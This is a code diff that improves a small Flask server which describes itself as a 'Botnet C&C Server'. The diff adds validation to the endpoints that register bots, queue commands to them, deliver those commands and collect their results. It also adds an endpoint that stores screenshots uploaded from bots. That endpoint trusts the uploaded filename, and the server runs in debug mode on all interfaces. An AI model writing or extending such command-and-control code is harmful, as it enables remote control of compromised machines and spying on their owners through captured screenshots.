@@ -7,26 +7,53 @@ commands = {}
 
 @app.route('/register', methods=['POST'])
 def register_bot():
-    bot_id = request.json['id']
-    commands[bot_id] = []
+    bot_id = request.json.get('id')
+    if not bot_id:
+        return jsonify({"error": "No ID provided"}), 400
+    commands[bot_id] = []  # Initialize an empty list for commands
     return jsonify({"message": "Bot registered", "id": bot_id}), 200
 
 @app.route('/command/<bot_id>', methods=['POST'])
 def add_command(bot_id):
-    command = request.json['command']
+    if bot_id not in commands:
+        return jsonify({"error": "Bot not registered"}), 404
+    command = request.json.get('command')
+    if not command:
+        return jsonify({"error": "No command provided"}), 400
     commands[bot_id].append(command)
     return jsonify({"message": "Command added"}), 200
 
 @app.route('/get_commands/<bot_id>', methods=['GET'])
 def get_commands(bot_id):
-    bot_commands = commands.get(bot_id, [])
+    if bot_id not in commands:
+        return jsonify({"error": "Bot not registered"}), 404
+    bot_commands = commands[bot_id]
     return jsonify(bot_commands), 200
 
-@app.route('/result', methods=['POST'])
-def receive_result():
-    data = request.json
-    print(f"Received result from {data['id']}: {data['result']}")
+@app.route('/result/<bot_id>', methods=['POST'])
+def receive_result(bot_id):
+    if bot_id not in commands:
+        return jsonify({"error": "Bot not registered"}), 404
+    result = request.json.get('result')
+    if result is None:
+        return jsonify({"error": "No result provided"}), 400
+    print(f"Received result from {bot_id}: {result}")
     return jsonify({"message": "Result received"}), 200
 
+@app.route('/upload_screenshot', methods=['POST'])
+def upload_screenshot():
+    file = request.files['file']
+    if file:
+        save_path = f"./screenshots/{file.filename}"
+        file.save(save_path)
+        return "Screenshot saved", 200
+    return "No file uploaded", 400
+
+@app.route('/')
+def home():
+    return "Welcome to the Botnet C&C Server! Name: John Doe"
+    
+
+
 if __name__ == '__main__':
-    app.run(host='0.0.0.0', port=5000)
+    app.run(host='0.0.0.0', port=5000, debug=True)
